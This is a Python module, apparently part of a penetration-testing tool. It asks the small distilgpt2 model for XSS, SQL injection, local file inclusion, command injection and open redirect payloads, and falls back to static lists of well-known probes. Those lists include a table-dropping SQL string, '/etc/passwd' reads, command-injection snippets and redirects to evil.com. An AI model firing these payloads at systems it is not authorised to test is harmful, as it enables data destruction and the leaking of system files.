# ai/payload_generator.py
from transformers import pipeline, AutoTokenizer, AutoModelForCausalLM
import torch

class PayloadGenerator:
    def __init__(self):
        # distilgpt2 modelini yükle
        model_name = "distilgpt2"
        self.tokenizer = AutoTokenizer.from_pretrained(model_name)
        self.model = AutoModelForCausalLM.from_pretrained(model_name)
        
        # Pad token eksikse ekle
        if self.tokenizer.pad_token is None:
            self.tokenizer.pad_token = self.tokenizer.eos_token
            
        # Text generation pipeline oluştur
        self.generator = pipeline(
            "text-generation",
            model=self.model,
            tokenizer=self.tokenizer,
            device=0 if torch.cuda.is_available() else -1  # GPU varsa kullan
        )

    def generate_xss_payloads(self, context="", count=5):
        """AI ile XSS payload'ları üret"""
        prompt = f"Generate {count} advanced XSS payloads for penetration testing"
        if context:
            prompt += f" targeting a parameter in {context}"
        prompt += " that bypass common filters:"
        
        try:
            outputs = self.generator(
                prompt,
                max_new_tokens=100,
                num_return_sequences=1,
                temperature=0.8,
                top_p=0.9,
                do_sample=True,
                pad_token_id=self.tokenizer.eos_token_id
            )
            # Basit ayıklama: prompt'u kaldır ve temizle
            generated_text = outputs[0]['generated_text']
            payloads = generated_text.replace(prompt, '').strip().split('\n')
            # Boşlukları temizle ve boş olmayanları al
            cleaned_payloads = [p.strip() for p in payloads if p.strip()]
            if not cleaned_payloads:
                # Eğer AI hiçbir şey döndürmediyse, statik listeyi kullan
                return self._get_static_xss_payloads(count)
            return cleaned_payloads[:count]
        except Exception as e:
            print(f"[!] AI XSS payload üretme hatası: {e}")
            return self._get_static_xss_payloads(count)

    def generate_sqli_payloads(self, context="", count=5):
        """AI ile SQL Injection payload'ları üret"""
        prompt = f"Generate {count} advanced SQL injection payloads for testing database vulnerabilities"
        if context:
            prompt += f" in a {context} application"
        prompt += ":"
        
        try:
            outputs = self.generator(
                prompt,
                max_new_tokens=100,
                num_return_sequences=1,
                temperature=0.8,
                top_p=0.9,
                do_sample=True,
                pad_token_id=self.tokenizer.eos_token_id
            )
            generated_text = outputs[0]['generated_text']
            payloads = generated_text.replace(prompt, '').strip().split('\n')
            cleaned_payloads = [p.strip() for p in payloads if p.strip()]
            if not cleaned_payloads:
                return self._get_static_sqli_payloads(count)
            return cleaned_payloads[:count]
        except Exception as e:
            print(f"[!] AI SQLi payload üretme hatası: {e}")
            return self._get_static_sqli_payloads(count)

    def generate_lfi_payloads(self, context="", count=5):
        """AI ile LFI payload'ları üret"""
        prompt = f"Generate {count} advanced Local File Inclusion (LFI) payloads for reading system files"
        if context:
            prompt += f" in a {context} application"
        prompt += ":"
        
        try:
            outputs = self.generator(
                prompt,
                max_new_tokens=100,
                num_return_sequences=1,
                temperature=0.8,
                top_p=0.9,
                do_sample=True,
                pad_token_id=self.tokenizer.eos_token_id
            )
            generated_text = outputs[0]['generated_text']
            payloads = generated_text.replace(prompt, '').strip().split('\n')
            cleaned_payloads = [p.strip() for p in payloads if p.strip()]
            if not cleaned_payloads:
                return self._get_static_lfi_payloads(count)
            return cleaned_payloads[:count]
        except Exception as e:
            print(f"[!] AI LFI payload üretme hatası: {e}")
            return self._get_static_lfi_payloads(count)

    def generate_cmd_payloads(self, context="", count=5):
        """AI ile Command Injection payload'ları üret"""
        prompt = f"Generate {count} advanced command injection payloads for executing system commands"
        if context:
            prompt += f" in a {context} application"
        prompt += ":"
        
        try:
            outputs = self.generator(
                prompt,
                max_new_tokens=100,
                num_return_sequences=1,
                temperature=0.8,
                top_p=0.9,
                do_sample=True,
                pad_token_id=self.tokenizer.eos_token_id
            )
            generated_text = outputs[0]['generated_text']
            payloads = generated_text.replace(prompt, '').strip().split('\n')
            cleaned_payloads = [p.strip() for p in payloads if p.strip()]
            if not cleaned_payloads:
                return self._get_static_cmd_payloads(count)
            return cleaned_payloads[:count]
        except Exception as e:
            print(f"[!] AI Command Injection payload üretme hatası: {e}")
            return self._get_static_cmd_payloads(count)

    def generate_redirect_payloads(self, context="", count=5):
        """AI ile Open Redirect payload'ları üret"""
        prompt = f"Generate {count} advanced open redirect payloads to redirect users to malicious sites"
        if context:
            prompt += f" in a {context} application"
        prompt += ":"
        
        try:
            outputs = self.generator(
                prompt,
                max_new_tokens=100,
                num_return_sequences=1,
                temperature=0.8,
                top_p=0.9,
                do_sample=True,
                pad_token_id=self.tokenizer.eos_token_id
            )
            generated_text = outputs[0]['generated_text']
            payloads = generated_text.replace(prompt, '').strip().split('\n')
            cleaned_payloads = [p.strip() for p in payloads if p.strip()]
            if not cleaned_payloads:
                return self._get_static_redirect_payloads(count)
            return cleaned_payloads[:count]
        except Exception as e:
            print(f"[!] AI Open Redirect payload üretme hatası: {e}")
            return self._get_static_redirect_payloads(count)

    # --- Statik fallback payload'lar ---
    def _get_static_xss_payloads(self, count):
        """Fallback: statik XSS payload listesi"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>"
        ]
        return payloads[:count]

    def _get_static_sqli_payloads(self, count):
        """Fallback: statik SQLi payload listesi"""
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM information_schema.tables; --",
            "') OR ('1'='1",
            "1' ORDER BY 1--"
        ]
        return payloads[:count]

    def _get_static_lfi_payloads(self, count):
        """Fallback: statik LFI payload listesi"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
        ]
        return payloads[:count]

    def _get_static_cmd_payloads(self, count):
        """Fallback: statik Command Injection payload listesi"""
        payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "`id`",
            "$(cat /etc/passwd)",
        ]
        return payloads[:count]

    def _get_static_redirect_payloads(self, count):
        """Fallback: statik Open Redirect payload listesi"""
        payloads = [
            "http://evil.com",
            "//evil.com",
            "https://malicious.site",
            "?redirect=http://evil.com",
            "&url=//evil.com",
        ]
        return payloads[:count]
